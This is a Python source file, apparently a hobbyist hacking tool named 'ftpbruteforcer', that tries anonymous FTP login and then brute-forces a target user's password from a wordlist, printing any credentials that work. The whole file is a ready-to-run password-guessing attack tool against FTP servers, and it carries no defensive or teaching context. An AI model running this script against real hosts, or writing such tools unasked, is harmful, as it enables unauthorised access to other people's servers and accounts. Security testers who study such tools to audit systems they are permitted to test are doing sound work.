import ftplib
import argparse
from termcolor import colored

#Coded by DipTN
#Connection function with FTP
def connect(host,user,password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user,password)
        ftp.quit()
        return True
    except:
        return False
    
def main():
    
    #Parser Call
    parser = argparse.ArgumentParser("python ftpbruteforcer.py") 
    parser.add_argument("-t" ,"--target", dest="targetHostAddress", type=str, help="The address of the host", required=True)
    parser.add_argument("-u" ,"--username", dest="userName", type=str, help="The username of the host", required=True)
    parser.add_argument("-w" ,"--worldlist", dest="Password", type=str, help="The path of the wordlist", required=True)
    args = parser.parse_args()
    
    #Target address request
    targetHostAddress = args.targetHostAddress
    #Username request
    userName = args.userName
    #passwordsFieldPath = raw_input("Enter the password path : ")
    passwordsFieldPath = args.Password
    
    #Connect with login anonymous
    banner = """
    
  _______ _______  _____  ______   ______ _     _ _______ _______
  |______    |    |_____] |_____] |_____/ |     |    |    |______
  |          |    |       |_____] |    \_ |_____|    |    |______
    
                                                  [Version] : 1.0
                                                    
"""
    print (colored(banner,'light_green'))
    print ("[+] Using anonymous credentials for " + targetHostAddress)
    if connect(targetHostAddress, 'anonymous', 'anonymous'):
        print (colored("[*] FTP Anonymous log on succeed on host ",'green') + targetHostAddress)
    else:
        print (colored("[*] FTP Anonymous log on failed on host " + targetHostAddress,'red'))
        
        #Brute force with dictionary
        #Open dictionary
        passwordsFile = open(passwordsFieldPath, 'r')
        
        for line in passwordsFile.readlines():
            #Clean the lines in the dictionary file
            password = line.strip('\r').strip('\n')
            print (colored("[Testing] ... ",'yellow') + str(password))
            
            if connect(targetHostAddress,userName,password):
                #Found password
                print ("")
                print (colored(">>>> FTP Logon succeeded on host " + targetHostAddress + " <<<<",'light_green'))
                print (colored("[*] The username is : ",'light_green') + userName)
                print (colored("[*] The password is : ",'light_green') + password)
                print ("")
                exit(0)
            else:
                #Not found password
                print (colored("[*] FTP Logon failed on host " + targetHostAddress,'red'))
    print ("")            
    print (colored(">>>> PASSWORD NOT FOUND! <<<<",'light_red'))
    
#Call main
if __name__ =="__main__":
        main()
